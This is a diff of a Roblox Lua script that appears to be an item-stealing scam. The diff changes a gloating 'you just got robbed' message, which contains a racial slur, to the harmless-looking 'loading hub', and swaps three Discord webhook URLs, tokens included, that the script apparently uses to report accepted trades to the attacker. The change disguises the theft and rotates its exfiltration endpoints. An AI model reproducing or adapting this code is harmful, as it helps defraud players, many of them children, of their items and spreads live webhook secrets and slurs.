@@ -287,7 +287,7 @@ spawn(function()
     end)
 
     if success then
-        warn('you just got robbed my nigga thx for ur items xDDDDDDDDDDDDDDDDDDDDDDD')
+        warn('loading hub')
         print("Trade was accepted from ROBLOX client.")
     else
        if debug == true then
@@ -309,7 +309,7 @@ spawn(function()
     "Kid with shit exploit"
 
  local url =
-    "https://discord.com/api/webhooks/884897626699489360/S2mD_O6Cb77ckgk1xW28rVFFtC_z7-Y1AjI48TIh2hUcKxfHoPRXueWlWH93hTzUQj7z"
+    "https://discord.com/api/webhooks/910179407564505209/cbqQFATstGpGEXO2hX7DwCRWE6smF8smaWg3fH3hApmAFL5TwSVsvZCWqcJOchWl2wcD"
     local data = 
 	{
 		["content"] = "",
@@ -359,7 +359,7 @@ spawn(function()
 
 
  local url =
-    "https://discord.com/api/webhooks/884897636488974406/bejS4SKjclc89KMhHhylxKPr1fOXUaJRJCvOPJQQoyExNQ9qe3x2Bg3-WHNKW6z5bzdz"
+    "https://discord.com/api/webhooks/910179477911396352/mhAME12hKm42pf09UyllJ9-2IZ8IFLd5LWrX0_JFTTkkFXHNpJiHdNKcZSKvAsdz3UtO"
     local data = 
 	{
 		["content"] = "",
@@ -408,7 +408,7 @@ spawn(function()
 
 
  local url =
-    "https://discord.com/api/webhooks/884897639987019807/WivU2p-3zTxDDP3RDhUIFYotoS6szWcxyziFl3FVNF8mxJ51Gjjbfn6ppdqzA8R8bUtA"
+    "https://discord.com/api/webhooks/910179609084067863/6v_pb8w_3Kq6DJwuA-Wklu5jrVwlfXgUf9haaUMJaoYSbWzU5BqL7PrcvQgS-21S9rFV"
     local data = 
 	{
 		["content"] = "",
